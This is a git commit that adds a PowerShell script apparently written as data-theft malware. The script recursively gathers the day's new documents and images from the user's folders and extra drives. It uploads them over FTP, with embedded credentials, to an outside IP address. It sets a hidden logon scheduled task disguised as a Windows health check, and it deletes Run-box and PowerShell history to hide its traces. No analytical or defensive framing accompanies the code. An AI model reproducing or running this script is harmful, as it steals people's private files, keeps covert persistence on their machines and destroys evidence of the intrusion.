6bb76026e473be0ef1b6d7c27116d47fcb41a0c9
louist12 <114141279+louist12@users.noreply.github.com>
2022-11-24 06:15:56 -0500

    Add files via upload

---
+++ a.ps1
@@ -0,0 +1,32 @@
+﻿$web=New-Object System.Net.WebClient
+$FTP = "ftp://testadmin:testpassword@192.119.71.89/files/"
+$Dir = "C:\Users\$env:username\Desktop","C:\Users\$env:username\Downloads","C:\Users\$env:username\Documents","D:\","E:\","F:\"
+foreach($item in (Get-ChildItem -Path $Dir -Include *.txt,*.xlsx,*.xls,*.pdf,*.docx,*.doc,*.jpg,*.png,*.jpeg,*.ppt -Recurse | Where{$_.CreationTime -gt (Get-Date).Date})){    
+    
+    $URI = New-Object System.Uri($FTP+$item.Name)
+    $web.UploadFile($URI, $item.FullName)
+    
+}
+# making a task-Scheduler
+$taskName = "WindowHealthCheckUp"
+Get-ScheduledTask | Where-Object {$_.TaskName -like $taskName} -ErrorAction SilentlyContinue -OutVariable task
+
+if (!$task) {
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -Exec Bypass -NonI -File $env:TMP\a.ps1"
+    $trigger = New-ScheduledTaskTrigger -AtLogOn 
+    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description 'PCHealth'
+}
+#Clearing fingerprinting
+function Clean-Exfil{
+	#delete run box history
+	reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+	
+	#delete powershell history
+	Remove-Item (Get-PSreadlineOption).HistorySavePath
+}
+Clean-Exfil
+
+
+
+
+
